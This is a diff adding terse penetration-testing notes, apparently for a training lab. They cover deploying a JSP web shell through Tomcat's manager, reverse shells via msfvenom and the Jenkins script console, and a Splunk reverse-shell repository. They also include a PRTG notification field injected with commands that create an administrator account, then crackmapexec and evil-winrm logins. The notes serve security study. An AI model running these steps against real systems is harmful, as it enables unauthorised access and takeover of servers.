@@ -97,4 +97,40 @@ Tomcat:
 
   http://web01.inlanefreight.local:8180 a
 
-  msf6 auxiliary(scanner/http/tomcat_mgr_login) 
+  msf6 auxiliary(scanner/http/tomcat_mgr_login)
+
+  /manager/html      GUI管理界面
+  
+  .WAR 文件      Web Application Archive
+                可以使用 zip 工具创建 WAR 文件      https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp      FileOutputStream(f);stream.write(m);o="uPlOaDeD:
+                OR
+                msfvenom, (payload) java/jsp_shell_reverse_tcp
+                Deploy web shell (cmd.jsp)
+                curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+
+  
+  Jenkins:
+    http://jenkins.inlanefreight.local:8000/configureSecurity/
+    http://jenkins.inlanefreight.local:8000/login?from=%2F
+    http://jenkins.inlanefreight.local:8000/script
+
+    upload Groovy script reverse-shell from GUI
+    msf      /exploit/multi/http/jenkins_script_console/
+
+
+Splunk:
+  https://github.com/0xjpuff/reverse_shell_splunk
+
+
+PRTG Network Monitor:
+  https://www.paessler.com/prtg
+
+  Login -> Setup -> Account Settings -> Notifications
+  set the "Program File" field to "Demo exe notification - outfile.ps1" and set the "Parameter" field to a command:
+    test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add            create a user on the Windows system running PRTG and add it to the local administrators group
+  sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
+  evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+
+
+osTicket:
+  
